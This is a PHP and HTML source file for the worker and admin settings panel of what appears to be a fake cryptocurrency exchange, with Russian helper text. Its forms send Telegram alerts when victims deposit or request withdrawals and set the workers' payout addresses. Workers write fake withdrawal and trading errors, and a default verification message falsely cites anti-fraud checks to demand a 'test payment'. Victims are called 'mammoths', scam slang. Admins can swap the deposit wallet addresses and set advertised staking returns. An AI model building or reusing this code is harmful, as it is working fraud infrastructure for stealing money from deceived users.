<?php
require $_SERVER['DOCUMENT_ROOT']."/api/init.php";

$domain_worker = get_domains_worker();
if(!check_is_worker()){
    header("Location: /login");
}
$auth_token = $_COOKIE['auth_token'];
$user_info = get_user_info($auth_token);
$withdraw_address = json_decode($user_info['payment_address'], true);
$settings = get_settings();
$staking_percents = json_decode($settings['staking_percents'], true);

?>
<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Partner Panel | Binding</title>
    <link rel="stylesheet" href="/assets/styles/admin.css">
    <link rel="stylesheet" href="/assets/styles/output.css">
    <link rel="stylesheet" href="/assets/fonts/stylesheet.css">
    <link rel="stylesheet" href="/assets/notify/simple-notify.min.css" />
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.4/jquery.min.js"></script>
    <script src="/assets/notify/simple-notify.min.js"></script>
</head>

<body>
<header >
    <div  onclick="window.location.href = '/wallet'" class="logo">
        <img src="/assets/images/logo.svg" class="logo_img" alt="logo">
        <h3 ><?=$domain_titleINIT?></h3>
    </div>
    <div class="login_block gap-0" id="login_block">
        <a href="#" id="profile" class="autorized_user"><?=$user_info['username']?></a>
        <img src="/assets/users_avatars/standard_avatar.png" class="image_profile" alt="">


    </div>


</header>
    <main>
        <style>
            .content_card_header {
                border-bottom: 1px dashed rgba(42, 68, 95, 0.39);
                padding: 10px 0px;
                width: 100%;
            }
            .content_inputs{
                border-bottom: 1px dashed rgba(42, 68, 95, 0.39);
                padding: 10px 0px;
            }
        </style>
        <?=render_aside_admin()?>
        <section class="content">

            <h3>Settings</h3>
            <div class="content_container binding">



                <div class="content_card">
                    <div class="content_card_header">
                        <h2>Main settings</h2>

                    </div>
                    <div class="content_card_main">
                        <form action="" id="telegram_binding_form">
                            <div class="content_card_header" style="width: fit-content; border-bottom: none; margin-bottom: 5px">
                                <h2>Total deposits</h2>
                                <div class="border_blue"></div>

                            </div>
                            <div class="content_inputs">

                                <p class="inpt_helper">Открываем бота @userinfobot (кликабельно), вводим /start
                                    Бот напишет ваш ID
                                    Копируем и вставляем цифры в поле ниже и нажимаем кнопку Save changes (можно указать
                                    несколько ID через запятую: 123,455,667). <br>
                                    Заходим в бота @<?=$domain_titleINIT?>Team и пишем /start</p>
                                <div class="input_hint">
                                    <div>Telegram ID</div>
                                    <input type="text" name="chat_id" placeholder="Chat Id" value="<?=$user_info['telegram']?>">
                                </div>

                                <div style="display: flex; justify-content: space-between; align-items: center;">
                                    <div>
                                        <p class="inpt_helper">Вы будете получать уведомления в ТГ каждый раз, когда ваш
                                            юзер:
                                            <ul style="list-style: unset; padding: 0px 12px;">
                                                <li class="inpt_helper">написал в саппорт</li>
                                                <li class="inpt_helper">сделал депозит</li>
                                                <li class="inpt_helper">запросил вывод</li>
                                                <li class="inpt_helper">включил 2FA</li>
                                                <li class="inpt_helper">oтправил документы для KYC</li>
                                            </ul>
                                        </p>
                                    </div>
                                    <button class="main_btn" type="submit">Привязать телеграм</button>
                                </div>
                            </div>


                        </form>
                        <form action="" id="paymentAddress_binding_form">
                            <div class="content_card_header" style="width: fit-content; border-bottom: none; margin-bottom: 5px">
                                <h2>Your payment addresses</h2>
                                <div class="border_orange"></div>

                            </div>
                            <div class="content_inputs">

                                <p class="inpt_helper">Здесь вы должны указать свои крипто адреса для выплат. <br>
                                    Все выплаты будут осуществляться только на те адреса, которые указаны здесь.</p>
                                <div class="input_hint">
                                    <div>BITCOIN:</div>
                                    <input name="address1" type="text" value="<?=$withdraw_address['address1']?>"  placeholder="bc1...">

                                </div>
                                <div class="input_hint">
                                    <div>LITECOIN:</div>
                                    <input name="address2" type="text" value="<?=$withdraw_address['address2']?>" placeholder="ltc2...">

                                </div>
                                <div class="input_hint">
                                    <div>USDT (TRC20):</div>
                                    <input name="address3" type="text" value="<?=$withdraw_address['address3']?>" placeholder="tbf5...">
                                </div>

                                <div style="display: flex; align-items: center;">

                                    <button class="main_btn" type="submit">Save changes</button>
                                </div>
                            </div>


                        </form>
                        <form action="" id="withdraw_binding_form">
                            <div class="content_card_header" style="width: fit-content; border-bottom: none; margin-bottom: 5px">
                                <h2>Withdraw error</h2>
                                <div class="border_red"></div>

                            </div>
                            <div class="content_inputs" style="border-bottom: none">

                                <p class="inpt_helper">Ошибка, которая отобразится при попытке юзером вывести средства с биржи</p>

                                <div class="input_hint">

                                    <input type="text" id="withdraw_error" name="withdraw_error" placeholder="Введите ошибку" value="<?=$user_info['withdraw_error']?>" class="main_input" id="">

                                </div>
                                <div style="display: flex; align-items: center;">


                                </div>
                            </div>
                            <div class="content_card_header" style="width: fit-content; border-bottom: none; margin-bottom: 5px">
                                <h2>Withdrawal minimal limit</h2>
                                <div class="border_yellow"></div>

                            </div>
                            <div class="content_inputs">

                                <p class="inpt_helper">Минимальная сумма для вывода всех валют</p>
                                <div class="input_hint">
                                    <div>Amount ($)</div>
                                    <input type="text" oninput="validateInput_numbers(this)"  id="minLimit" value="<?=$user_info['minLimit']?>" name="minLimit" placeholder="100">

                                </div>
                                <div style="display: flex; align-items: center;">

                                    <button class="main_btn" type="submit">Save changes</button>
                                </div>
                            </div>


                        </form>
                        <form action="" id="textsError_binding_form">
                            <div class="content_card_header" style="width: fit-content; border-bottom: none; margin-bottom: 5px">
                                <h2>All text error</h2>
                                <div class="border_green"></div>

                            </div>
                            <div class="content_inputs" >



                                <div class="errors_block" style="display: flex; gap: 50px;  align-items: center;">
                                    <div style="max-width: 450px">
                                        <h3 style="margin-bottom: 20px">
                                            Trading error
                                        </h3>
                                        <p class="inpt_helper" style="margin-bottom: 10px">
                                            Ошибка, которая отобразится при попытке юзером начать торговлю (открыть Buy/Sell Order) на странице Trading
                                        </p>
                                        <textarea id="trading_error" style="resize: none; width: 100%;height: 150px;  max-width: 450px"  name="trading_error" placeholder="You must have a minimum balance to make trades on the trading page." class="main_input"><?=$user_info['trading_error']?></textarea>
                                    </div>
                                    <div style="max-width: 450px">
                                        <h3 style="margin-bottom: 20px">
                                            Verification Page Error
                                        </h3>
                                        <p class="inpt_helper" style="margin-bottom: 10px">
                                            Текст, который отобразится мамонтам на странице верификации (если оставить пустым, то отобразится дефолтный текст)
                                        </p>
                                        <textarea style="resize: none; height: 150px;  max-width: 450px; width: 100%" name="verif_error" id="verif_error"  placeholder="Suspicious activity has been detected in your account by our automated anti-fraud system. To proceed with the withdrawal operation, you must complete the identification process for your account in accordance with our service terms and AML/KYC policy.To complete this process, you must make a test payment in any currency from the provided list. Once verified, the funds will be credited to your account balance and made available for withdrawal." class="main_input"><?=$user_info['verification_error']?></textarea>
                                    </div>

                                </div>
                                <div style="display: flex; gap: 5px">
                                    <button class="main_btn" type="submit">Save changes</button>
                                    <button class="main_btn" style="color: #355270;background-color: transparent; border: 1px solid #355270;" onclick="changeBack()">Change back</button>
                                </div>
                            </div>


                        </form>
                        <?php if(check_is_admin()):?>
                        <form action="" id="stakingProcent_binding_form">
                            <div class="content_card_header" style="width: fit-content; border-bottom: none; margin-bottom: 5px">
                                <h2>Staking percents</h2>
                                <div class="border_dark_blue"></div>

                            </div>
                            <div class="content_inputs">

                                <p class="inpt_helper">Вы можете изменить проценты по планам для ваших юзеров. <br>
                                    Проценты указываются за 1 день (система автоматически умножает ваш процент на срок плана).</p>
                                <div class="input_hint">
                                    <div>1 week:</div>
                                    <input type="text" value="<?=$staking_percents['week1']?>" name="1week" placeholder="1.3">
                                    <div>%</div>

                                </div>
                                <div class="input_hint">
                                    <div>2 week:</div>
                                    <input type="text" value="<?=$staking_percents['week2']?>" name="2week" placeholder="1.6">
                                    <div>%</div>

                                </div>
                                <div class="input_hint">
                                    <div>1 month:</div>
                                    <input type="text" value="<?=$staking_percents['mouth1']?>" name="1mouth" placeholder="2.1">
                                    <div>%</div>
                                </div>
                                <div class="input_hint">
                                    <div>3 month:</div>
                                    <input type="text" value="<?=$staking_percents['mouth3']?>" name="3month" placeholder="2.6">
                                    <div>%</div>
                                </div>

                                <div style="display: flex; align-items: center;">

                                    <button class="main_btn" type="submit">Save changes</button>
                                </div>
                            </div>


                        </form>
                        <form action="" id="minimalDeposit_binding_form">
                            <div class="content_card_header" style="width: fit-content; border-bottom: none; margin-bottom: 5px">
                                <h2>Minimal deposit amount </h2>
                                <div class="border_light_blue"></div>

                            </div>
                            <div class="content_inputs">

                                <p class="inpt_helper">Напишите сумму в долларах которая автоматически будет конвертирован для всех валют по отдельности на странице "Deposit".</p>
                                <div class="input_hint">
                                    <div>Amount ($)</div>
                                    <input type="text" name="amount" placeholder="deposit" value="<?=$settings['min_deposit']?>">
                                    <div>%</div>

                                </div>

                                <div style="display: flex; align-items: center;">

                                    <button class="main_btn" type="submit">Save changes</button>
                                </div>
                            </div>


                        </form>
                        <form action="" id="changeWalletsDeposit_binding_form">
                            <div class="content_card_header" style="width: fit-content; border-bottom: none; margin-bottom: 5px">
                                <h2>Сhange of wallet addresses </h2>
                                <div class="border_purple"></div>

                            </div>


                            <div class="content_inputs">

                                <p class="inpt_helper">Выберите монету, и укажите кошелек</p>
                                <div class="input_hint">
                                    <div>Select Coin</div>
                                    <select name="coin" class="main_input">
                                        <?=render_list_coins()?>
                                    </select>
                                    <div><svg xmlns="http://www.w3.org/2000/svg" width="12" height="7" viewBox="0 0 12 7" fill="none">
                                            <path d="M5.46967 6.53033C5.76256 6.82322 6.23744 6.82322 6.53033 6.53033L11.3033 1.75736C11.5962 1.46447 11.5962 0.989593 11.3033 0.696699C11.0104 0.403806 10.5355 0.403806 10.2426 0.696699L6 4.93934L1.75736 0.696699C1.46447 0.403806 0.989593 0.403806 0.696699 0.696699C0.403806 0.989593 0.403806 1.46447 0.696699 1.75736L5.46967 6.53033ZM5.25 5V6H6.75V5H5.25Z" fill="white" fill-opacity="0.7"/>
                                        </svg></div>

                                </div>

                                <div class="input_hint">
                                    <div>Address</div>
                                    <input type="text"  name="address" placeholder="Enter a new address" >


                                </div>
                                <div style="display: flex; align-items: center;">

                                    <button class="main_btn" type="submit">Save changes</button>
                                </div>
                            </div>


                        </form>
                        <?php endif; ?>
                    </div>

                </div>
            </div>

        </section>

    </main>
</body>
<script src="/assets/scripts/main.js"></script>
<script>
    const telegram_binding_form = document.getElementById("telegram_binding_form");
    telegram_binding_form.addEventListener("submit", function(e) {
        e.preventDefault();
        const formData = new FormData(telegram_binding_form);
        $.ajax({
            url: "/api/ajax/binding_telegram_worker.php",
            type: "POST",
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
                if (data.status === "success") {
                    new Notify({
                        title: "Success",
                        text: "Telegram ID successfully added",
                        status: "success",
                        autoclose: true,
                        autotimeout: 3000
                    });
                } else {
                    new Notify({
                        title: "Error",
                        text: "Telegram ID not added",
                        status: "error",
                        autoclose: true,
                        autotimeout: 3000
                    });
                }
            }
        });
    });

    const changeWalletsDeposit_binding_form = document.getElementById("changeWalletsDeposit_binding_form");
    changeWalletsDeposit_binding_form.addEventListener("submit", function(e) {
        e.preventDefault();
        const formData = new FormData(changeWalletsDeposit_binding_form);
        $.ajax({
            url: "/api/ajax/set_wallet_address.php",
            type: "POST",
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
                if (data.status === "success") {
                    new Notify({
                        title: "Success",
                        text: "Wallet address successfully changed",
                        status: "success",
                        autoclose: true,
                        autotimeout: 3000
                    });
                } else {
                    new Notify({
                        title: "Error",
                        text: "Wallet address not changed",
                        status: "error",
                        autoclose: true,
                        autotimeout: 3000
                    });
                }
            }
        });
    });
    const paymentAddress_binding_form = document.getElementById("paymentAddress_binding_form");
    paymentAddress_binding_form.addEventListener("submit", function(e) {
        e.preventDefault();
        const formData = new FormData(paymentAddress_binding_form);
        $.ajax({
            url: "/api/ajax/binding_paymentAddress_worker.php",
            type: "POST",
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
                if (data.status === "success") {
                    new Notify({
                        title: "Success",
                        text: "Payment addresses successfully added",
                        status: "success",
                        autoclose: true,
                        autotimeout: 3000
                    });
                } else {
                    new Notify({
                        title: "Error",
                        text: "Payment addresses not added",
                        status: "error",
                        autoclose: true,
                        autotimeout: 3000
                    });
                }
            }
        });
    });

    const withdraw_binding_form = document.getElementById("withdraw_binding_form");
    withdraw_binding_form.addEventListener("submit", function(e) {
        const minLimit = document.getElementById("minLimit");
        const withdraw_error = document.getElementById("withdraw_error");

        if (minLimit.value === "" || withdraw_error.value === "") {
            new Notify({
                title: "Error",
                text: "Заполните все поля",
                status: "error",
                autoclose: true,
                autotimeout: 3000
            });
            e.preventDefault();
            return;
        }
        e.preventDefault();
        const formData = new FormData(withdraw_binding_form);
        $.ajax({
            url: "/api/ajax/binding_withdraw_worker.php",
            type: "POST",
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
                if (data.status === "success") {
                    new Notify({
                        title: "Success",
                        text: "Withdraw error successfully added",
                        status: "success",
                        autoclose: true,
                        autotimeout: 3000
                    });
                } else {
                    new Notify({
                        title: "Error",
                        text: "Withdraw error not added",
                        status: "error",
                        autoclose: true,
                        autotimeout: 3000
                    });
                }
            }
        });
    });
    const textsError_binding_form = document.getElementById("textsError_binding_form");
    textsError_binding_form.addEventListener("submit", function(e) {
        e.preventDefault();
        const formData = new FormData(textsError_binding_form);
        $.ajax({
            url: "/api/ajax/binding_textsError_worker.php",
            type: "POST",
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
                if (data.status === "success") {
                    new Notify({
                        title: "Success",
                        text: "Texts error successfully added",
                        status: "success",
                        autoclose: true,
                        autotimeout: 3000
                    });
                } else {
                    new Notify({
                        title: "Error",
                        text: "Texts error not added",
                        status: "error",
                        autoclose: true,
                        autotimeout: 3000
                    });
                }
            }
        });
    });

    const stakingProcent_binding_form = document.getElementById("stakingProcent_binding_form");
    stakingProcent_binding_form.addEventListener("submit", function(e) {
        e.preventDefault();
        const formData = new FormData(stakingProcent_binding_form);
        $.ajax({
            url: "/api/ajax/binding_stakingProcent_worker.php",
            type: "POST",
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
                if (data.status === "success") {
                    new Notify({
                        title: "Success",
                        text: "Staking percents successfully added",
                        status: "success",
                        autoclose: true,
                        autotimeout: 3000
                    });
                } else {
                    new Notify({
                        title: "Error",
                        text: "Staking percents not added",
                        status: "error",
                        autoclose: true,
                        autotimeout: 3000
                    });
                }
            }
        });
    });
    const minimalDeposit_binding_form = document.getElementById("minimalDeposit_binding_form");
    minimalDeposit_binding_form.addEventListener("submit", function(e) {
        e.preventDefault();
        const formData = new FormData(minimalDeposit_binding_form);
        $.ajax({
            url: "/api/ajax/binding_minimalDeposit_worker.php",
            type: "POST",
            data: formData,
            processData: false,
            contentType: false,
            success: function(data) {
                if (data.status === "success") {
                    new Notify({
                        title: "Success",
                        text: "Minimal deposit amount successfully added",
                        status: "success",
                        autoclose: true,
                        autotimeout: 3000
                    });
                } else {
                    new Notify({
                        title: "Error",
                        text: "Minimal deposit amount not added",
                        status: "error",
                        autoclose: true,
                        autotimeout: 3000
                    });
                }
            }
        });
    });
    function changeBack(){
        const trading_error = document.getElementById("trading_error");
        const verif_error = document.getElementById("verif_error");
        trading_error.value = "You must have a minimum balance to make trades on the trading page.";
        verif_error.value = "Suspicious activity has been detected in your account by our automated anti-fraud system. To proceed with the withdrawal operation, you must complete the identification process for your account in accordance with our service terms and AML/KYC policy.To complete this process, you must make a test payment in any currency from the provided list. Once verified, the funds will be credited to your account balance and made available for withdrawal.";
    }
</script>


</html>